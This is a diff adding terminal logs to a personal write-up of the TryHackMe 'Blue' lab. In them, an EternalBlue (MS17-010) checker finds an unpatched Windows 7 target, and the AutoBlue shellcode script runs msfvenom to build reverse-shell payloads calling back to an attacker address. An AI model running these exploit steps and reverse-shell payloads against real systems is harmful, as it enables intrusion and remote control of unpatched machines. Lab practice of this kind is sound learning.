@@ -133,3 +133,58 @@ did the prerequisite, went in to get the flag, but ended up with some error duri
 
 221020 2230hr
 
+
+
+┌──(kali㉿kali)-[~/tryhackme/blue/AutoBlue-MS17-010]
+└─$ python3 eternal_checker.py 10.10.207.186                                                                                                                                                   1 ⨯ 4 ⚙
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
+
+
+┌──(kali㉿kali)-[~/tryhackme/blue/AutoBlue-MS17-010/shellcode]
+└─$ ./shell_prep.sh                                                                                                                                                                                4 ⚙
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+10.4.24.92
+LPORT you want x64 to listen on:
+1234
+LPORT you want x86 to listen on:
+1235
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+Generating x64 cmd shell (stageless)...
+
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.4.24.92 LPORT=1234
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (stageless)...
+
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.4.24.92 LPORT=1235
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
